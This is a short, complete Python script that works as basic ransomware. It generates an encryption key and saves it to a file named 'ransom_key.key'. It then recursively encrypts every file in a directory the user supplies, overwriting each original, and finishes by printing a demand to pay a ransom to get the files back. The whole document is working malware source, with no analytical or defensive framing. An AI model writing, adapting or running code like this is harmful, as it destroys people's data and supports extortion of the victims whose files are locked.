import os
import random
from cryptography.fernet import Fernet

# Generate a key
def generate_key():
    return Fernet.generate_key()

# Load the key
def load_key(key_file):
    return open(key_file, "rb").read()

# Encrypt a file
def encrypt_file(filename, key):
    fernet = Fernet(key)
    with open(filename, "rb") as file:
        original_data = file.read()
    encrypted_data = fernet.encrypt(original_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)

# Encrypt all files in a directory
def encrypt_files_in_directory(directory, key):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

# Main function
if __name__ == "__main__":
    key = generate_key()
    with open("ransom_key.key", "wb") as key_file:
        key_file.write(key)

    directory_to_encrypt = input("Enter the directory to encrypt: ")
    encrypt_files_in_directory(directory_to_encrypt, key)

    print("Encryption completed. Pay the ransom to decrypt your files.")
